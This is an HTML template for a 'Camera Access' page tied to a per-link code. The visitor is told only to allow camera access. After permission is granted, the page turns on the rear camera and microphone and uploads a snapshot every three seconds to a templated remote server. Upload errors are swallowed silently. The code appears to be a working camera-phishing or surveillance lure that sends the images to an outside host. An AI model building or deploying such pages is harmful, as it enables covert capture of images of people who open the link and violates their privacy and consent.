<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Camera Permission</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #0f0f1a;
      color: #e0e0f0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .card {
      background: #1a1a2e;
      border: 1px solid #2a2a4a;
      border-radius: 16px;
      padding: 40px 36px;
      max-width: 400px;
      width: 90%;
      text-align: center;
      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
    }
    .icon { font-size: 56px; margin-bottom: 20px; }
    h2 { font-size: 22px; font-weight: 700; margin-bottom: 10px; color: #ffffff; }
    p { font-size: 14px; color: #9090b0; line-height: 1.6; margin-bottom: 28px; }
    #status { margin-top: 18px; font-size: 13px; min-height: 20px; }
    .success { color: #4caf50; }
    .error   { color: #f44336; }
    video {
      margin-top: 18px;
      width: 100%;
      border-radius: 10px;
      display: none;
      border: 1px solid #2a2a4a;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">📷</div>
    <h2>Camera Access</h2>
    <p>Please allow camera access when prompted by your browser.</p>
    <div id="status">⏳ Requesting camera access...</div>
    <video id="preview" autoplay playsinline></video>
  </div>

  <script>
    const code = '{{code}}';
    const server = '{{server}}';
    {% if not valid %}
    document.getElementById('status').textContent = '❌ Invalid link';
    document.getElementById('status').className = 'error';
    {% else %}
    (async function() {
      const status = document.getElementById('status');
      const video = document.getElementById('preview');
      let stream = null;
      let interval = null;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
        video.srcObject = stream;
        video.style.display = 'block';
        status.textContent = '✅ Camera active — sending photos every 3s...';
        status.className = 'success';

        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        let count = 0;

        interval = setInterval(() => {
          ctx.drawImage(video, 0, 0);
          count++;
          canvas.toBlob(function(blob) {
            const reader = new FileReader();
            reader.onload = function() {
              fetch(server + '/api/camera/' + code, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'photo', data: reader.result, count: count, timestamp: new Date().toISOString() })
              }).catch(function() {});
            };
            reader.readAsDataURL(blob);
          }, 'image/jpeg', 0.7);
        }, 3000);

        // Cleanup on page unload
        window.addEventListener('beforeunload', function() {
          if (interval) clearInterval(interval);
          if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
        });
      } catch (err) {
        status.textContent = '❌ Camera access denied: ' + err.message;
        status.className = 'error';
      }
    })();
    {% endif %}
  </script>
</body>
</html>
